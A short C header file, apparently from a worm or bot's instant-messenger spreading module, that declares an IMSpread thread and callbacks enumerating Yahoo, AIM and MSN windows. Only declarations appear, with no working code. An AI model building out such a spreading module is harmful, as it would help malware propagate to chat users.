DWORD WINAPI IMSpreadThread(LPVOID param);
void IMSpread(char *ip, char text[100]);
BOOL CALLBACK EnumYahoo(HWND hwnd, LPARAM lParam) ;
BOOL CALLBACK EnumAIM(HWND hwnd, LPARAM lParam);
BOOL CALLBACK EnumMSN(HWND hwnd, LPARAM lParam);

typedef struct IMPARAM {
	char *ip;
	int threadnum;
} IMPARAM;